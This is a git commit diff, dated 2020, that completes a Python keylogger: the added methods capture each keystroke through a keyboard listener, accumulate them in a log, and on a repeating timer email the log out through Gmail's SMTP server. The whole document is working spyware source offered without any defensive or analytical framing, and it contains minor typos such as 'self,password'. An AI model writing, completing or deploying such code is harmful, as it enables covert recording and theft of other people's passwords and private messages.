339844be382eedb0e7ef30d04cbef77b5613f7ac
tarunadityaselva <tarunadityaselva@gmail.com>
2020-08-13 11:37:31 +0530

    keylogger.py complete

--- keylogger.py
+++ keylogger.py
@@ -22,4 +22,37 @@ class KeyLogger:
     self.log = self.log + string
 
   #create keylogger
+  def on_press(self, key):
+    try:
+      current_key = str(key.char)
+    except AttributeError:
+      if key == key.space:
+        current_key = " "
+      elif key == key.esc:
+        print ("Exciting Proogram")
+        return False
+      else:
+        current_key = " " + str(key) + " "
+    self.append_to_log(current_key)
+    
 
+  #code to create email and stuff
+  def send_mail(self, email, password, message):
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email, password)
+    server.sendmail(email, email, message)
+    server.quit()
+
+  #sending email and report
+  def report_n_send(self):
+    send_off = self.send_mail(self.email, self,password, "\n\n" + self.log)
+    self.log = ""
+    timer = threading.Timer(self.interval, self.report_n_send)
+    timer.start()
+
+  def start(self):
+    keyboard_listener = keyboard.Listener(on_press = self.on_press)
+    with keyboard_listener:
+      self.report_n_send()
+      keyboard_listener.join()
